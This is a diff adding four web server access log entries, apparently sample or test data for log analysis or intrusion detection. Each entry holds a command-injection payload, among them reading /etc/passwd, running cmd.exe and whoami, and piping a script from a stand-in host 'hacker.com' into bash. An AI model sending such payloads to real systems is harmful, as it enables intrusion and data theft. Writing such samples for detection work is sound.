@@ -1,0 +1,4 @@
+127.0.0.1 - - [23/Dec/2025:13:55:36] "GET /product?id=1;cat+/etc/passwd HTTP/1.1" 200 3322
+192.168.0.10 - - [23/Dec/2025:13:56:01] "GET /login?user=admin&pass=1234;cmd.exe+/c+dir HTTP/1.1" 500 123
+10.0.0.5 - - [23/Dec/2025:13:57:12] "POST /upload.php?file=malware.exe&cmd=whoami HTTP/1.1" 200 452
+172.16.0.2 - - [23/Dec/2025:13:58:20] "GET /download?url=http://hacker.com/malware.sh|bash HTTP/1.1" 404 721
